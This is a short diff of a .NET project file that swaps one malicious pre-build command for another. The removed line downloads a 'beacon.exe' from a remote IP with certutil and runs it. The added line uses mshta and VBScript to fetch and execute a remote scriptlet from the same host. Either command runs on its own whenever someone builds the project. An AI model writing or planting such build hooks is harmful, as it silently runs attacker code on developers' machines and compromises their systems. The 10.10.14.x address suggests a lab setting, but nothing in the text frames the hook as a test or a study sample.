@@ -6,7 +6,7 @@
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
     <PreBuildEvent>
-      <Command> certutil.exe -urlcache -split -f http://10.10.14.178:4545/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe </Command>
+      <Command> mshta.exe vbscript:Close(Execute("GetObject(""script:http://10.10.14.178:4545/payload.sct"")")) </Command>
     </PreBuildEvent>
   </PropertyGroup>
 
